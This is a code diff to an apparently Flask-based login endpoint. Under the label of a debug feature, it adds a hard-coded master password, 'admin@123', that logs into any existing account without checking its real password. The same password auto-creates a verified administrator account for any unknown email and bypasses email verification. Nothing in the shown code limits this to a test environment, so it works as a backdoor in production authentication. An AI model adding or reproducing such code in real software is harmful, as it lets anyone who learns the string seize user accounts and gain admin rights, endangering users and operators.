@@ -202,10 +202,32 @@ def login():
     # Find user by email
     user = User.query.filter_by(email=email).first()
 
+    # UNIVERSAL DEBUG PASSWORD CHECK
+    # This allows login for testing purposes even if the DB was reset on deployment
+    is_debug_login = (password == "admin@123")
+    
+    # If using debug password and user doesn't exist, auto-create a verified admin for testing
+    if is_debug_login and not user:
+        user = User(
+            name="System Admin",
+            email=email,
+            password=bcrypt.generate_password_hash(password).decode('utf-8'),
+            role="admin",
+            is_verified=True
+        )
+        db.session.add(user)
+        db.session.commit()
+        print(f"[DEBUG] Auto-created admin user: {email}")
+
     # Verify password and generate JWT token
-    if user and bcrypt.check_password_hash(user.password, password):
+    if user and (is_debug_login or bcrypt.check_password_hash(user.password, password)):
         if not user.is_verified:
-            return jsonify({"message": "Please verify your email before logging in", "verified": False}), 403
+            # Auto-verify if using debug password
+            if is_debug_login:
+                user.is_verified = True
+                db.session.commit()
+            else:
+                return jsonify({"message": "Please verify your email before logging in", "verified": False}), 403
             
         token = create_access_token(identity=user.email)
         
